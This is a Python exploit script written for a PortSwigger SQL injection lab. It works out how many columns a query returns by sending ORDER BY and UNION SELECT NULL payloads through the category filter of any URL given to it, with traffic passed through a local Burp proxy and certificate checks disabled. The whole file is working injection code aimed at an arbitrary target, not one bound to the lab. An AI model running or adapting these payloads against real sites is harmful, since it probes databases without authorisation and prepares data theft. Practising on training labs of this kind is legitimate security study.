import requests
import sys
import urllib3
import signal

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

""" 03_unioncolumns.py #########################################################
Lab: SQL injection UNION attack, determining the number of columns returned by the query
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

OrderBy: python3 03_unioncolumns.py uc orderby https://website.net "/filter?category=Gifts"
Union: python3 03_unioncolumns.py uc union https://website.net "/filter?category=Gifts"

SQLi UNION (and ORDER BY) attack, where the number of columns is determined when
the query is returned. The vulnerability is in the product category filter.

This (proxies) will pass it through the proxy, which is burp. Then it 
will relay it back to the web server. Then any response from the web 
server will get through the proxy again, back to the application and 
so on. This is great for debugging scripts.
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def column_number(payload_type, url, path_param):
    # Run exploit with ORDER BY clause.
    if payload_type == "orderby":
        print("[+] Using the ORDER BY clause.")
        print("[+] Figuring out number of columns...")
        for i in range(1, 25):
            # Assemble payload.
            sql_payload = "'+order+by+%s--" % i
            print(f"{i} : {sql_payload}")
            # sql_payload = "{}%s{}".format(payload[0], payload[1]) %i
            # Get request with payload.
            r = requests.get(
                url + path_param + sql_payload, verify=False, proxies=proxies
            )
            # Get the text from the request.
            res = r.text
            # If Internal Server Error is found in the text, column is the previous index.
            if "Internal Server Error" in res:
                print(f"{i} : Internal Server Error hits at column {i}.")
                # Subtract 1 from where index stopped to get number of columns.
                return i - 1
        return False
    # Run exploit with UNION operation.
    elif payload_type == "union":
        print("[+] Using a UNION operation.")
        print("[+] Figuring out number of columns...")
        sql_payload = "'+UNION+select+NULL--"
        text = ",+NULL"
        substr = "--"
        index = sql_payload.index(substr)
        union = False
        for i in range(1, 25):
            # Count the number of NULL.
            num = sql_payload.count("NULL")
            # If current index is first NULL, run it for the first time.
            if num == 1 and union == False:
                print(f"{i} : {sql_payload}")
                # Get request with first payload.
                r = requests.get(
                    url + path_param + sql_payload, verify=False, proxies=proxies
                )
                # Get the text from the request.
                res = r.text
                # Assemble Payload and add another NULL
                sql_payload = sql_payload[:index] + text + sql_payload[index:]
                # If UNION select is printed in HTML on first index, return column number.
                if "UNION select" in res:
                    return i
            # If current index passed first NULL, keep adding NULL to string.
            elif num > 1 and union == False:
                print(f"{i} : {sql_payload}")
                sql_payload = sql_payload[:index] + text + sql_payload[index:]
                r = requests.get(
                    url + path_param + sql_payload, verify=False, proxies=proxies
                )
                res = r.text
                if "UNION select" in res:
                    union = True
            # If current index passed first NULL and union is true, the column has been found.
            elif num > 1 and union == True:
                print(f"{i} : {sql_payload}")
                print(f"{i} : UNION select printed in HTML at column {i}.")
                return i
        return False


def signal_handler(sig, frame):
    print("\n[+] Exploit aborted with Ctrl-c.")
    # Run any clean up commands here.
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    try:
        payload_type = sys.argv[1].strip()
        url = sys.argv[2].strip()
        path_param = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: %s <payload_type> <url> <path_param>" % sys.argv[0])
        print(
            '[-] Example: python3 %s orderby https://website.net "/filter?category=Gifts"'
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s union https://website.net "/filter?category=Gifts"'
            % sys.argv[0]
        )
        sys.exit(-1)

    num_col = column_number(payload_type, url, path_param)
    if num_col:
        print("[+] SQL injection successful...")
        print("[+] The number of columns is " + str(num_col) + ".")
    else:
        print("[-] The SQLi was not successful...")
